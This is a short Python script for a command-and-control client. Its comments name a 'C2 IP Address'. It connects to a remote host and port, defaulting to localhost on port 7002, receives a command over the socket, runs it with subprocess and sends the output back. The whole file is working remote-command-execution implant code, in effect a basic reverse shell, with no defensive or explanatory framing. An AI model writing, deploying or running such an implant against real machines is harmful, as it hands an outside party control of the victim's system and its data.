#!/usr/bin/python3

# Standard libraries only
import socket
import subprocess
import base64

# Initialize remote host variables with user input
#rhost = str(input("C2 IP Address\n" ))
#rport = int(input("C2 Port\n"))
rhost = '127.0.0.1'
rport = 7002
rserver = (rhost, rport)

# Connect out
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(rserver)
cmd = s.recv(1024).decode()
print(cmd)

# Run returned command
cmdarg = str(cmd).split(" ")
execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
s.sendall(bytes(execute.stdout, "utf-8"))